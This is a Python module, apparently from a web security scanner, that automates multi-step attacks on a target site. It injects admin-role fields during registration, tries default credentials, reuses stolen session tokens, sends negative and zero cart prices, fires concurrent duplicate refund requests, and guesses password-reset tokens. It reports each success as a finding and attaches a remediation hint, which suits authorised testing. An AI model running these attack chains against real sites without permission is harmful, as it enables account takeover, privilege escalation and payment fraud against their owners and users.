"""
Attack Chain Engine — Multi-step chained vulnerability detection
Simulates attacker thinking: Login → Token Steal → Privilege Escalate → Data Dump
"""

import requests
import time
import json
import re
import threading
from urllib.parse import urlparse, urljoin

HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; CyberSudarshan/1.0)"}
TIMEOUT = 10

FIX = {
    "Attack Chain: Auth → Privilege Escalation":
        "Implement proper session validation at every step. "
        "Never trust client-supplied role/privilege data.",
    "Attack Chain: Cart → Payment Bypass":
        "Validate price server-side at every checkout step. "
        "Never trust client-sent amounts.",
    "Attack Chain: Token → Account Takeover":
        "Use short-lived tokens. Implement token binding and rotation.",
    "Attack Chain: Registration → Admin Bypass":
        "Never accept role/privilege fields during registration. "
        "Assign roles server-side only.",
    "Stateful Logic Flaw":
        "Implement server-side state machine for multi-step workflows. "
        "Validate each step independently.",
    "Race Condition: Coupon/Payment":
        "Use database-level locks (SELECT FOR UPDATE) for financial operations.",
}

def safe_get(url, params=None, cookies=None, headers=None):
    try:
        h = {**HEADERS, **(headers or {})}
        return requests.get(url, params=params, headers=h,
                            cookies=cookies, timeout=TIMEOUT,
                            verify=False, allow_redirects=True)
    except Exception:
        return None

def safe_post(url, data=None, json_data=None, cookies=None, headers=None):
    try:
        h = {**HEADERS, **(headers or {})}
        return requests.post(url, data=data, json=json_data,
                             headers=h, cookies=cookies,
                             timeout=TIMEOUT, verify=False,
                             allow_redirects=True)
    except Exception:
        return None

def finding(vuln_type, severity, url, description, chain=""):
    return {
        "type":        vuln_type,
        "severity":    severity,
        "url":         url,
        "description": description,
        "proof":       f"Attack chain: {chain}" if chain else "",
        "fixSnippet":  FIX.get(vuln_type, "Review multi-step workflow security."),
    }


# ─────────────────────────────────────────────
# CHAIN 1: Registration → Role Manipulation
# ─────────────────────────────────────────────

def chain_registration_privilege(base_url, forms, findings):
    reg_forms = [f for f in forms if any(
        i.get("name","").lower() in
        ["email","username","password","register","signup"]
        for i in f.get("inputs",[])
    )]
    if not reg_forms:
        return

    form   = reg_forms[0]
    action = form.get("action","")
    inputs = form.get("inputs",[])

    # Step 1: Register with elevated role
    data = {i["name"]: "test" for i in inputs}
    for i in inputs:
        n = i.get("name","").lower()
        if "email" in n:    data[i["name"]] = f"attacker_{int(time.time())}@evil.com"
        if "password" in n: data[i["name"]] = "Test@123456"
        if "username" in n: data[i["name"]] = f"attacker_{int(time.time())}"

    # Inject privilege fields
    data.update({
        "role":         "admin",
        "is_admin":     "true",
        "privilege":    "superuser",
        "account_type": "admin",
        "user_type":    "administrator",
    })

    resp1 = safe_post(action, data=data)
    if not resp1:
        return

    # Step 2: Try to access admin panel
    admin_paths = ["/admin", "/dashboard", "/admin/users",
                   "/api/admin", "/manage", "/control"]
    session_cookies = resp1.cookies

    for path in admin_paths:
        url = base_url.rstrip("/") + path
        resp2 = safe_get(url, cookies=session_cookies)
        if resp2 and resp2.status_code == 200:
            if any(x in resp2.text.lower() for x in
                   ["admin","dashboard","manage","users","settings"]):
                findings.append(finding(
                    "Attack Chain: Registration → Admin Bypass",
                    "Critical", action,
                    f"CHAIN ATTACK: Registered with role=admin → accessed {path}. "
                    "Mass assignment allowed privilege escalation during signup.",
                    f"POST {action} with role=admin → GET {path} (200 OK)"
                ))
                return


# ─────────────────────────────────────────────
# CHAIN 2: Login → Token Steal → Account Takeover
# ─────────────────────────────────────────────

def chain_auth_token_steal(base_url, forms, findings):
    login_forms = [f for f in forms if any(
        i.get("type","") == "password"
        for i in f.get("inputs",[])
    )]
    if not login_forms:
        return

    form   = login_forms[0]
    action = form.get("action","")
    inputs = form.get("inputs",[])

    weak_creds = [
        ("admin","admin"), ("test","test123"), ("admin","password"),
        ("user","user123"), ("demo","demo"), ("guest","guest"),
    ]

    session_cookies = None
    logged_in_resp  = None

    for username, password in weak_creds:
        data = {i["name"]: "test" for i in inputs}
        for i in inputs:
            n = i.get("name","").lower()
            t = i.get("type","").lower()
            if "email" in n or "user" in n or "login" in n:
                data[i["name"]] = username
            if t == "password" or "pass" in n:
                data[i["name"]] = password

        resp = safe_post(action, data=data)
        if not resp:
            continue

        # Check if login succeeded
        if resp.status_code in [200,302]:
            if any(x in resp.text.lower() for x in
                   ["logout","dashboard","welcome","profile","account"]):
                session_cookies = resp.cookies
                logged_in_resp  = resp
                break
            # Check redirect
            if resp.status_code == 302:
                loc = resp.headers.get("Location","")
                if any(x in loc.lower() for x in
                       ["dashboard","home","account","profile"]):
                    session_cookies = resp.cookies
                    logged_in_resp  = resp
                    break

    if not session_cookies:
        return

    # Step 2: Try to steal/reuse token
    token = None
    for cookie in session_cookies:
        if any(x in cookie.name.lower() for x in
               ["token","session","auth","jwt","access"]):
            token = cookie.value
            break

    if not token:
        # Check response for token
        tokens = re.findall(
            r'"(?:token|access_token|jwt)":\s*"([^"]{20,})"',
            logged_in_resp.text
        )
        token = tokens[0] if tokens else None

    if token:
        # Step 3: Try to access other user data with this token
        test_urls = [
            f"{base_url.rstrip('/')}/api/users/1",
            f"{base_url.rstrip('/')}/api/profile",
            f"{base_url.rstrip('/')}/api/me",
        ]
        for test_url in test_urls:
            resp3 = safe_get(test_url, cookies=session_cookies,
                             headers={"Authorization": f"Bearer {token}"})
            if resp3 and resp3.status_code == 200:
                findings.append(finding(
                    "Attack Chain: Token → Account Takeover",
                    "Critical", action,
                    f"CHAIN: Logged in with weak creds → extracted auth token → "
                    f"accessed protected endpoint {test_url}. "
                    "Token reuse across accounts possible.",
                    f"Login({username}/{password}) → Token extracted → "
                    f"GET {test_url} (200 OK)"
                ))
                return


# ─────────────────────────────────────────────
# CHAIN 3: Cart → Coupon → Payment Bypass
# ─────────────────────────────────────────────

def chain_cart_payment_bypass(base_url, injectable_urls, findings):
    cart_keywords = ["cart","checkout","order","payment","purchase",
                     "buy","coupon","discount","promo"]
    cart_urls = [
        u for u in injectable_urls
        if any(k in u["url"].lower() for k in cart_keywords)
    ]
    if not cart_urls:
        return

    for cart_url in cart_urls[:3]:
        url    = cart_url["url"].split("?")[0]
        params = cart_url["params"]

        # Test negative price
        for param in params:
            if any(k in param.lower() for k in
                   ["price","amount","qty","quantity","total","cost"]):
                resp = safe_get(url, {param: "-1"})
                if resp and resp.status_code == 200:
                    if any(x in resp.text.lower() for x in
                           ["success","added","cart","checkout"]):
                        findings.append(finding(
                            "Attack Chain: Cart → Payment Bypass",
                            "Critical", url,
                            f"CHAIN: Negative value ({param}=-1) accepted in cart. "
                            "Price manipulation leads to free/refund exploit.",
                            f"GET {url}?{param}=-1 → success response"
                        ))
                        return

                # Test zero price
                resp2 = safe_get(url, {param: "0"})
                if resp2 and resp2.status_code == 200:
                    if "success" in resp2.text.lower():
                        findings.append(finding(
                            "Attack Chain: Cart → Payment Bypass",
                            "High", url,
                            f"CHAIN: Zero value ({param}=0) accepted. "
                            "Free purchase may be possible.",
                            f"GET {url}?{param}=0 → success"
                        ))
                        return


# ─────────────────────────────────────────────
# CHAIN 4: Refund/Cancel Flow Abuse
# ─────────────────────────────────────────────

def chain_refund_abuse(base_url, injectable_urls, findings):
    refund_keywords = ["refund","cancel","return","chargeback","reverse"]
    refund_urls = [
        u for u in injectable_urls
        if any(k in u["url"].lower() for k in refund_keywords)
    ]

    for refund_url in refund_urls[:3]:
        url    = refund_url["url"].split("?")[0]
        params = refund_url["params"]

        # Try refunding same order multiple times
        import threading
        results = []
        def try_refund():
            resp = safe_get(url, {p: "1" for p in params[:2]})
            if resp:
                results.append(resp.status_code)

        threads = [threading.Thread(target=try_refund) for _ in range(5)]
        for t in threads: t.start()
        for t in threads: t.join()

        success_count = results.count(200)
        if success_count >= 3:
            findings.append(finding(
                "Stateful Logic Flaw",
                "High", url,
                f"CHAIN: Multiple simultaneous refund requests all succeeded "
                f"({success_count}/5). Race condition in refund flow — "
                "same order may be refunded multiple times.",
                f"5 concurrent requests to {url} → {success_count} succeeded"
            ))
            return


# ─────────────────────────────────────────────
# CHAIN 5: Password Reset → Account Takeover
# ─────────────────────────────────────────────

def chain_password_reset_takeover(base_url, forms, findings):
    reset_paths = ["/forgot-password","/reset-password","/password/reset",
                   "/auth/reset","/account/recover"]
    base = base_url.rstrip("/")

    for path in reset_paths:
        url   = base + path
        resp1 = safe_get(url)
        if not resp1 or resp1.status_code not in [200,302]:
            continue

        # Step 1: Request reset for target
        resp2 = safe_post(url, data={"email": "admin@target.com"})
        if not resp2:
            continue

        # Step 2: Try predictable tokens
        token_patterns = [
            "123456","000000","111111","admin","reset",
            "password","test123","aaaaaa","999999",
        ]
        for token in token_patterns:
            test_urls = [
                f"{url}?token={token}",
                f"{url}?reset_token={token}",
                f"{url}?code={token}",
            ]
            for test_url in test_urls:
                resp3 = safe_get(test_url)
                if resp3 and resp3.status_code == 200:
                    if not any(x in resp3.text.lower() for x in
                               ["invalid","expired","error","not found"]):
                        findings.append(finding(
                            "Attack Chain: Token → Account Takeover",
                            "Critical", url,
                            f"CHAIN: Password reset token '{token}' accepted. "
                            "Predictable reset tokens allow account takeover.",
                            f"POST {url} (request reset) → "
                            f"GET {test_url} (token accepted)"
                        ))
                        return


# ─────────────────────────────────────────────
# MAIN ENTRY
# ─────────────────────────────────────────────

def run(target_url, crawl_data, emit):
    findings_list = []
    forms    = crawl_data.get("forms", [])
    inj_urls = crawl_data.get("injectable_urls", [])

    emit("Attack Chain — Registration → Privilege Escalation", 91)
    chain_registration_privilege(target_url, forms, findings_list)

    emit("Attack Chain — Login → Token → Takeover", 92)
    chain_auth_token_steal(target_url, forms, findings_list)

    emit("Attack Chain — Cart → Payment Bypass", 93)
    chain_cart_payment_bypass(target_url, inj_urls, findings_list)

    emit("Attack Chain — Refund Race Condition", 93)
    chain_refund_abuse(target_url, inj_urls, findings_list)

    emit("Attack Chain — Password Reset → Takeover", 94)
    chain_password_reset_takeover(target_url, forms, findings_list)

    emit(f"Attack Chain — Complete. {len(findings_list)} chain vulns found.", 94)
    return findings_list